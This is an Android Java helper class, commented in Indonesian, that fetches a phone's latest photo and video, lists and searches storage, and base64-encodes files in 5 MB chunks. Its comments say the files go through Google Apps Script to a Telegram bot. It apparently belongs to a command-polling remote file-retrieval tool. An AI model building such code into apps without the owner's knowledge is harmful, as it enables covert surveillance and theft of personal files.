package com.example.app;

import android.Manifest;
import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.provider.MediaStore;
import android.util.Base64;
import android.util.Log;

import androidx.core.content.ContextCompat;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.List;

/**
 * Helper untuk semua operasi file dan media di penyimpanan HP.
 *
 * Batas file:
 * - File ≤ 5 MB   : dikirim sekaligus (single request ke GAS)
 * - File > 5 MB   : dipecah jadi chunk 5 MB, dikirim bertahap
 * - File > 50 MB  : ditolak (batas Telegram Bot API)
 *
 * FilePollingService yang memutuskan mode mana berdasarkan
 * FileResult.isChunked dan FileResult.totalChunks.
 */
public class FileHelper {

    private static final String TAG = "FileHelper";

    // Ukuran per chunk saat kirim file besar (5 MB raw = ~6.7 MB base64)
    // Masih dalam batas GAS UrlFetch ~10 MB per request
    public static final int  CHUNK_SIZE_BYTES    = 5 * 1024 * 1024;

    // File di atas 50 MB ditolak (batas Telegram Bot API)
    public static final long MAX_FILE_SIZE_BYTES = 50 * 1024 * 1024L;

    // File <= batas ini dikirim sekaligus (single chunk)
    public static final long SINGLE_SEND_LIMIT   = CHUNK_SIZE_BYTES;

    // =========================================================
    // INNER CLASS — HASIL OPERASI FILE
    // =========================================================

    public static class FileResult {
        public final boolean hasFile;
        public final String  name;
        public final String  path;
        public final long    size;
        public final String  mimeType;
        public final String  base64;       // isi file (single send, ≤5 MB)
        public final boolean tooBig;       // true jika > 50 MB (ditolak)
        public final boolean isChunked;    // true jika perlu chunked send
        public final int     totalChunks;  // jumlah chunk kalau isChunked

        public FileResult(
                boolean hasFile, String name, String path,
                long size, String mimeType, String base64,
                boolean isChunked, int totalChunks) {
            this.hasFile     = hasFile;
            this.name        = name;
            this.path        = path;
            this.size        = size;
            this.mimeType    = mimeType;
            this.base64      = base64;
            this.tooBig      = (base64 == null && hasFile && !isChunked);
            this.isChunked   = isChunked;
            this.totalChunks = totalChunks;
        }

        public String sizeLabel() {
            if (size < 1024)             return size + " B";
            if (size < 1024 * 1024)      return (size / 1024) + " KB";
            return String.format("%.1f MB", size / (1024.0 * 1024.0));
        }
    }

    // =========================================================
    // FOTO TERBARU
    // =========================================================

    public static FileResult getLatestPhoto(Context context) {

        if (!hasMediaPermission(context, true)) {
            return new FileResult(false, "Izin tidak ada", "", 0, "", null, false, 0);
        }

        Uri collection;
        String[] projection = {
                MediaStore.Images.Media._ID,
                MediaStore.Images.Media.DISPLAY_NAME,
                MediaStore.Images.Media.DATA,
                MediaStore.Images.Media.SIZE,
                MediaStore.Images.Media.MIME_TYPE
        };

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            collection = MediaStore.Images.Media.getContentUri(
                    MediaStore.VOLUME_EXTERNAL);
        } else {
            collection = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
        }

        try (Cursor cursor = context.getContentResolver().query(
                collection,
                projection,
                null, null,
                MediaStore.Images.Media.DATE_ADDED + " DESC"
        )) {
            if (cursor != null && cursor.moveToFirst()) {
                String name     = cursor.getString(1);
                String path     = cursor.getString(2);
                long   size     = cursor.getLong(3);
                String mimeType = cursor.getString(4);

                return buildFileResult(path, name, size, mimeType);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error getLatestPhoto", e);
        }

        return new FileResult(false, "Tidak ada foto", "", 0, "", null, false, 0);
    }

    // =========================================================
    // VIDEO TERBARU
    // =========================================================

    public static FileResult getLatestVideo(Context context) {

        if (!hasMediaPermission(context, false)) {
            return new FileResult(false, "Izin tidak ada", "", 0, "", null, false, 0);
        }

        Uri collection;
        String[] projection = {
                MediaStore.Video.Media._ID,
                MediaStore.Video.Media.DISPLAY_NAME,
                MediaStore.Video.Media.DATA,
                MediaStore.Video.Media.SIZE,
                MediaStore.Video.Media.MIME_TYPE
        };

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            collection = MediaStore.Video.Media.getContentUri(
                    MediaStore.VOLUME_EXTERNAL);
        } else {
            collection = MediaStore.Video.Media.EXTERNAL_CONTENT_URI;
        }

        try (Cursor cursor = context.getContentResolver().query(
                collection,
                projection,
                null, null,
                MediaStore.Video.Media.DATE_ADDED + " DESC"
        )) {
            if (cursor != null && cursor.moveToFirst()) {
                String name     = cursor.getString(1);
                String path     = cursor.getString(2);
                long   size     = cursor.getLong(3);
                String mimeType = cursor.getString(4);

                return buildFileResult(path, name, size, mimeType);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error getLatestVideo", e);
        }

        return new FileResult(false, "Tidak ada video", "", 0, "", null, false, 0);
    }

    // =========================================================
    // DAFTAR FILE
    // =========================================================

    /**
     * Daftar isi folder. Path kosong = root external storage.
     */
    public static List<String> listFiles(String path) {

        List<String> result = new ArrayList<>();

        File dir;

        if (path == null || path.trim().isEmpty() || path.equals("/")) {
            dir = Environment.getExternalStorageDirectory();
        } else {
            dir = new File(path);
        }

        if (!dir.exists() || !dir.isDirectory()) {
            result.add("❌ Folder tidak ditemukan: " + path);
            return result;
        }

        File[] files = dir.listFiles();

        if (files == null || files.length == 0) {
            result.add("📂 Folder kosong");
            return result;
        }

        // Urutkan: folder dulu, lalu file
        Arrays.sort(files, (a, b) -> {
            if (a.isDirectory() && !b.isDirectory()) return -1;
            if (!a.isDirectory() && b.isDirectory()) return 1;
            return a.getName().compareToIgnoreCase(b.getName());
        });

        for (File f : files) {
            if (f.isDirectory()) {
                result.add("📁 " + f.getName() + "/");
            } else {
                long   size  = f.length();
                String label = sizeLabel(size);
                result.add("📄 " + f.getName() + " (" + label + ")");
            }
        }

        return result;
    }

    // =========================================================
    // CARI FILE
    // =========================================================

    /**
     * Cari file berdasarkan nama (case-insensitive, partial match).
     * Maksimum 20 hasil untuk menghindari pesan terlalu panjang.
     */
    public static List<String> searchFiles(String query) {

        List<String> result  = new ArrayList<>();
        String       q       = query == null ? "" : query.trim().toLowerCase();

        if (q.isEmpty()) {
            result.add("❌ Query pencarian kosong");
            return result;
        }

        File root = Environment.getExternalStorageDirectory();
        searchRecursive(root, q, result, 0, 3);

        if (result.isEmpty()) {
            result.add("🔍 Tidak ditemukan file yang cocok dengan: " + query);
        }

        return result;
    }

    private static void searchRecursive(
            File dir, String query, List<String> result,
            int depth, int maxDepth) {

        if (depth > maxDepth || result.size() >= 20) return;
        if (!dir.exists() || !dir.isDirectory()) return;

        File[] files = dir.listFiles();
        if (files == null) return;

        for (File f : files) {
            if (result.size() >= 20) break;
            if (f.getName().toLowerCase().contains(query)) {
                if (f.isDirectory()) {
                    result.add("📁 " + f.getAbsolutePath() + "/");
                } else {
                    result.add("📄 " + f.getAbsolutePath()
                            + " (" + sizeLabel(f.length()) + ")");
                }
            }
            if (f.isDirectory()) {
                searchRecursive(f, query, result, depth + 1, maxDepth);
            }
        }
    }

    // =========================================================
    // AMBIL FILE BERDASARKAN NAMA / PATH
    // =========================================================

    public static FileResult getFileByPath(String path) {

        File file = new File(path);

        if (!file.exists() || file.isDirectory()) {
            return new FileResult(false, "File tidak ditemukan", path, 0, "", null, false, 0);
        }

        String mimeType = guessMimeType(file.getName());
        return buildFileResult(path, file.getName(), file.length(), mimeType);
    }

    // =========================================================
    // BACA FILE KE BASE64
    // =========================================================

    public static String readToBase64(String path) {

        try (
            FileInputStream fis = new FileInputStream(path);
            ByteArrayOutputStream bos = new ByteArrayOutputStream()
        ) {
            byte[] buffer = new byte[8192];
            int    count;
            while ((count = fis.read(buffer)) != -1) {
                bos.write(buffer, 0, count);
            }
            return Base64.encodeToString(bos.toByteArray(), Base64.NO_WRAP);
        } catch (Exception e) {
            Log.e(TAG, "Error read to base64: " + path, e);
            return null;
        }
    }

    // =========================================================
    // HELPER PRIVAT
    // =========================================================

    private static FileResult buildFileResult(
            String path, String name, long size, String mimeType) {

        // Tolak file > 50 MB (batas Telegram)
        if (size > MAX_FILE_SIZE_BYTES) {
            return new FileResult(true, name, path, size, mimeType,
                    null, false, 0);
        }

        // File ≤ 5 MB → kirim sekaligus
        if (size <= SINGLE_SEND_LIMIT) {
            String base64 = readToBase64(path);
            return new FileResult(true, name, path, size, mimeType,
                    base64, false, 0);
        }

        // File > 5 MB → mode chunked (FilePollingService yang kirim chunk)
        int totalChunks = (int) Math.ceil((double) size / CHUNK_SIZE_BYTES);
        return new FileResult(true, name, path, size, mimeType,
                null, true, totalChunks);
    }

    // =========================================================
    // BACA CHUNK (untuk chunked upload)
    // =========================================================

    /**
     * Baca satu chunk dari file, encode ke base64.
     * chunkIndex mulai dari 0.
     * Return null kalau gagal atau index di luar range.
     */
    public static String readChunkToBase64(String path, int chunkIndex) {

        File file = new File(path);
        if (!file.exists()) return null;

        long offset = (long) chunkIndex * CHUNK_SIZE_BYTES;
        if (offset >= file.length()) return null;

        int chunkSize = (int) Math.min(
                CHUNK_SIZE_BYTES,
                file.length() - offset
        );

        try (FileInputStream fis = new FileInputStream(file)) {

            long skipped = fis.skip(offset);
            if (skipped != offset) return null;

            byte[] buffer = new byte[chunkSize];
            int    read   = 0;
            int    count;

            while (read < chunkSize &&
                    (count = fis.read(buffer, read, chunkSize - read)) != -1) {
                read += count;
            }

            if (read == 0) return null;

            byte[] data = read < chunkSize
                    ? java.util.Arrays.copyOf(buffer, read)
                    : buffer;

            return Base64.encodeToString(data, Base64.NO_WRAP);

        } catch (Exception e) {
            Log.e(TAG, "Error readChunkToBase64 chunk=" + chunkIndex, e);
            return null;
        }
    }

    private static boolean hasMediaPermission(Context context, boolean isImage) {

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            String perm = isImage
                    ? Manifest.permission.READ_MEDIA_IMAGES
                    : Manifest.permission.READ_MEDIA_VIDEO;
            return ContextCompat.checkSelfPermission(context, perm)
                    == PackageManager.PERMISSION_GRANTED;
        }

        return ContextCompat.checkSelfPermission(
                context, Manifest.permission.READ_EXTERNAL_STORAGE
        ) == PackageManager.PERMISSION_GRANTED;
    }

    static String sizeLabel(long size) {
        if (size < 1024)        return size + " B";
        if (size < 1024 * 1024) return (size / 1024) + " KB";
        return String.format("%.1f MB", size / (1024.0 * 1024.0));
    }

    private static String guessMimeType(String name) {
        if (name == null) return "application/octet-stream";
        String lower = name.toLowerCase();
        if (lower.endsWith(".jpg") || lower.endsWith(".jpeg")) return "image/jpeg";
        if (lower.endsWith(".png"))  return "image/png";
        if (lower.endsWith(".gif"))  return "image/gif";
        if (lower.endsWith(".webp")) return "image/webp";
        if (lower.endsWith(".mp4"))  return "video/mp4";
        if (lower.endsWith(".mkv"))  return "video/x-matroska";
        if (lower.endsWith(".mp3"))  return "audio/mpeg";
        if (lower.endsWith(".pdf"))  return "application/pdf";
        if (lower.endsWith(".apk"))  return "application/vnd.android.package-archive";
        if (lower.endsWith(".zip"))  return "application/zip";
        if (lower.endsWith(".txt"))  return "text/plain";
        return "application/octet-stream";
    }
}
